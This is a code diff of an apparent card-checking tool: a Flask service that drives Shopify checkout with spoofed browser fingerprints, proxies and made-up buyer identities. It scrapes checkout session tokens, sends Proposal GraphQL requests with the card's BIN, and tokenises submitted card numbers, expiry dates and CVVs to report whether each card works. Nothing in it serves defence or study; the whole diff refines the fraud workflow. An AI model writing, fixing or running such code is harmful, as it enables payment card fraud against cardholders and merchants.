@@ -7,7 +7,7 @@ import uuid
 import time
 import json
 import urllib3
-from urllib.parse import quote
+from urllib.parse import quote, unquote, urlparse, parse_qs
 from flask import Flask, request, jsonify
 from curl_cffi import requests
 
@@ -36,7 +36,6 @@ STORES = [
 # ==========================================
 BROWSER_PROFILES = [
     {"impersonate": "chrome124", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
-    {"impersonate": "chrome120", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
 ]
 
 def get_random_browser(): return random.choice(BROWSER_PROFILES)
@@ -74,54 +73,11 @@ def parse_proxy(proxy_str):
         return f"socks5h://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
     return f"socks5h://{proxy_str}"
 
-def extract_session_token(html_text):
-    def clean(raw):
-        t = raw.strip()
-        if t.startswith("&quot;"): t = t[6:]
-        if t.endswith("&quot;"): t = t[:-6]
-        return t.strip('"\'') if len(t) > 50 else None
-
-    patterns = [r'name="serialized-sessionToken"\s+content="([^"]+)"', r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"', r'"sessionToken"\s*:\s*"([^"]+)"']
-    for pat in patterns:
-        m = re.search(pat, html_text)
-        if m:
-            token = clean(m.group(1))
-            if token: return token
-    return None
-
-# ==========================================
-# 🔑 PROPOSAL (To get the paymentMethodIdentifier)
-# ==========================================
-def run_proposal(session, shop_url, variant_id, cart_token, checkout_url, fn, ln, email, street, city, state, zipc, country_code, currency_code, amount, current_ua, stable_id, session_token, queue_token, build_id):
-    headers = {
-        "accept": "application/json", "content-type": "application/json", "origin": shop_url, "referer": checkout_url,
-        "x-checkout-one-session-token": session_token, "x-checkout-web-build-id": build_id, "user-agent": current_ua,
-        "shopify-checkout-client": "checkout-web/1.0", "shopify-checkout-source": f'id="{cart_token}", type="cn"',
-    }
-    payload = {
-        "variables": {
-            "sessionInput": {"sessionToken": session_token}, "queueToken": queue_token,
-            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
-            "delivery": {"deliveryLines": [{"selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]}, "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": True}], "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True},
-            "deliveryExpectations": {"deliveryExpectationLines": []},
-            "merchandise": {"merchandiseLines": [{"stableId": stable_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"value": {"amount": str(amount), "currencyCode": currency_code}}}]},
-            "memberships": {"memberships": []},
-            "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": country_code, "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}}, "creditCardBin": "", "allowStoreCredit": False},
-            "buyerIdentity": {"customer": {"presentmentCurrency": currency_code, "countryCode": country_code}, "email": email, "emailChanged": True, "phoneCountryCode": country_code, "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}], "rememberMe": False},
-            "taxes": {"proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency_code}}}, "note": {"message": None, "customAttributes": []},
-            "localizationExtension": {"fields": []}, "nonNegotiableTerms": None,
-            "optionalDuties": {"buyerRefusesDuties": False}, "cartMetafields": [], "includeBuyerProposalDelivery": False,
-        },
-        "operationName": "Proposal",
-        "id": "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
-    }
-    try:
-        r = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal", headers=headers, json=payload, timeout=20)
-        data = r.json()
-        seller = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {})
-        return seller.get("payment", {}).get("paymentLines", [{}])[0].get("paymentMethod", {}).get("directPaymentMethod", {}).get("paymentMethodIdentifier")
-    except Exception:
-        return None
+def find_between(text, start, end):
+    if not text: return None
+    pattern = re.escape(start) + r"(.*?)" + re.escape(end)
+    match = re.search(pattern, text)
+    return match.group(1) if match else None
 
 # ==========================================
 # 🛒 FULL CHECKOUT PROCESS
@@ -156,28 +112,54 @@ def process_checkout(card_data, proxy_url, store):
         r = session.get(real_checkout_url, headers={"user-agent": current_ua}, timeout=20)
         clean_text = html.unescape(r.text)
 
-        # Extract dynamic country/currency
-        dynamic_country_code = (re.search(r'"country"\s*:\s*\{\s*"code"\s*:\s*"([A-Z]{2})"', clean_text) or [None, "US"])[1]
+        # Extract tokens from HTML
+        x_checkout_one_session_token = find_between(clean_text, 'serialized-session-token" content="', '"')
+        if not x_checkout_one_session_token:
+            x_checkout_one_session_token = find_between(clean_text, '"sessionToken":"', '"')
+
+        queue_token = find_between(clean_text, '"queueToken":"', '"')
+        stable_id = find_between(clean_text, '"stableId":"', '"')
+        
+        if not stable_id: return {"Response": "MISSING_STABLE_ID", "success": False}
+
+        fn, ln, email, street, city, state, zipc, dynamic_country_code = generate_random_identity()
+
+        build_id = (re.search(r'"commitSha"\s*:\s*"([0-9a-f]{40})"', clean_text) or [None, ""])[1]
         dynamic_currency_code = (re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', clean_text) or [None, "USD"])[1]
         dynamic_amount = (re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', clean_text) or [None, "2.50"])[1]
 
-        # Extract tokens
-        x_checkout_one_session_token = extract_session_token(clean_text) or ""
-        queue_token = (re.search(r'"queueToken"\s*:\s*"([^"]+)"', clean_text) or [None, ""])[1]
-        stable_id = (re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', clean_text) or [None, None])[1]
-        build_id = (re.search(r'"commitSha"\s*:\s*"([0-9a-f]{40})"', clean_text) or [None, ""])[1]
-
-        if not stable_id: return {"Response": "MISSING_STABLE_ID", "success": False}
-
-        fn, ln, email, street, city, state, zipc, _ = generate_random_identity(dynamic_country_code)
-
-        # 4. Run Proposal to get the payment method ID
-        payment_method_id = run_proposal(
-            session, SHOP_URL, VARIANT_ID, cart_token, real_checkout_url,
-            fn, ln, email, street, city, state, zipc, dynamic_country_code, dynamic_currency_code, dynamic_amount, current_ua, stable_id, x_checkout_one_session_token, queue_token, build_id
-        )
+        # 4. Run Proposal to get paymentMethodIdentifier
+        proposal_headers = {
+            "accept": "application/json", "content-type": "application/json", "origin": SHOP_URL, "referer": real_checkout_url,
+            "x-checkout-one-session-token": x_checkout_one_session_token, "x-checkout-web-build-id": build_id, "user-agent": current_ua,
+            "shopify-checkout-client": "checkout-web/1.0", "shopify-checkout-source": f'id="{cart_token}", type="cn"',
+        }
+        proposal_payload = {
+            "variables": {
+                "sessionInput": {"sessionToken": x_checkout_one_session_token}, "queueToken": queue_token,
+                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
+                "delivery": {"deliveryLines": [{"selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]}, "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": True}], "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True},
+                "deliveryExpectations": {"deliveryExpectationLines": []},
+                "merchandise": {"merchandiseLines": [{"stableId": stable_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}", "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"value": {"amount": dynamic_amount, "currencyCode": dynamic_currency_code}}}]},
+                "memberships": {"memberships": []},
+                "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": dynamic_country_code, "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}}, "creditCardBin": ccn[:8], "allowStoreCredit": False},
+                "buyerIdentity": {"customer": {"presentmentCurrency": dynamic_currency_code, "countryCode": dynamic_country_code}, "email": email, "emailChanged": True, "phoneCountryCode": dynamic_country_code, "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}], "rememberMe": False},
+                "taxes": {"proposedTotalAmount": {"value": {"amount": "0", "currencyCode": dynamic_currency_code}}}, "note": {"message": None, "customAttributes": []},
+                "localizationExtension": {"fields": []}, "nonNegotiableTerms": None,
+                "optionalDuties": {"buyerRefusesDuties": False}, "cartMetafields": [], "includeBuyerProposalDelivery": False,
+            },
+            "operationName": "Proposal",
+            "id": "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
+        }
         
-        if not payment_method_id: return {"Response": "NO_PAYMENT_METHOD", "success": False}
+        r_proposal = session.post(f"{SHOP_URL}/checkouts/internal/graphql/persisted?operationName=Proposal", headers=proposal_headers, json=proposal_payload, timeout=20)
+        proposal_data = r_proposal.json()
+        
+        seller = proposal_data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {})
+        payment_method_id = seller.get("payment", {}).get("paymentLines", [{}])[0].get("paymentMethod", {}).get("directPaymentMethod", {}).get("paymentMethodIdentifier")
+
+        if not payment_method_id:
+            return {"Response": "NO_PAYMENT_METHOD", "success": False}
 
         # 5. Tokenize Card
         pci_payload = {"credit_card": {"number": ccn, "month": int(mm), "year": int(yyyy), "verification_value": cvv, "name": f"{fn} {ln}"}, "payment_session_scope": SHOP_URL.split("//")[1]}
